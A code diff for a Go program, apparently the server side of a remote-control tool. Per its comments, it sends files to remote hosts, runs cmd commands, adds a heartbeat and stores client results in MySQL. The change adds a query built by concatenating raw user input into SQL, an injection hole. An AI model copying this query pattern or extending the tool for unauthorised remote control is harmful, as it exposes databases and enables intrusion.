@@ -37,10 +37,10 @@ func InitMysql() (err error) {
 	return
 }
 
-// InsertNewDemo 在数据库中对数据库执行添加，删除，修改数据的功能
+// InsertNewDemo 实现对数据表执行增删改查的功能
 func InsertNewDemo() {
 	for {
-		fmt.Print("请选择insert or delete or update:")
+		fmt.Print("请选择insert,delete,update,select:")
 		instructed := bufio.NewReader(os.Stdin)
 		n, _ := instructed.ReadString('\n')
 		instructs := strings.Trim(n, "\r\n")
@@ -81,7 +81,16 @@ func InsertNewDemo() {
 			}else {
 				fmt.Print("update success!\n")
 			}
-		}else {
+		}else if instructs=="select" {
+			fmt.Print("请输入要查询的host_ip:\n")
+			selection:=bufio.NewReader(os.Stdin)
+			h,_:=selection.ReadString('\n')
+			selections:=strings.Trim(h,"\r\n")
+			var HostIp,information1,information2,information3 string
+			rows:=db.QueryRow("select * from result where host_ip="+"'"+selections+"'")   //获取一行数据
+			_=rows.Scan(&HostIp,&information1,&information2,&information3)        //将rows中的数据存到4个变量里面中
+			fmt.Println(HostIp,"--",information1,"--",information2,"--",information3)
+		} else {
 			fmt.Print("请重新选择操作！\n")
 		}
 		fmt.Print("是否返回cmd命令?(yes or no)")
@@ -128,7 +137,7 @@ func listeners() {
 	}
 }
 
-//选择操作(上传下载文件和执行cmd命令)
+//选择操作(上传下载文件，执行cmd命令，开启心跳功能)
 func selection() {
 	for {
 		//downfile向远程主机传输文件
@@ -215,7 +224,7 @@ func process() {
 		}
 		rec := string(buf[:n])
 		rec = ConvertToString(rec, "gbk", "utf-8")
-		fmt.Print("客户端传过来的结果为：", rec,"\n")
+		fmt.Print("客户端传过来的结果为：\n", rec,"\n")
 		fmt.Print("是否将结果存储进数据库?(yes or no)\n")
 		m := bufio.NewReader(os.Stdin)
 		result, err4 := m.ReadString('\n')
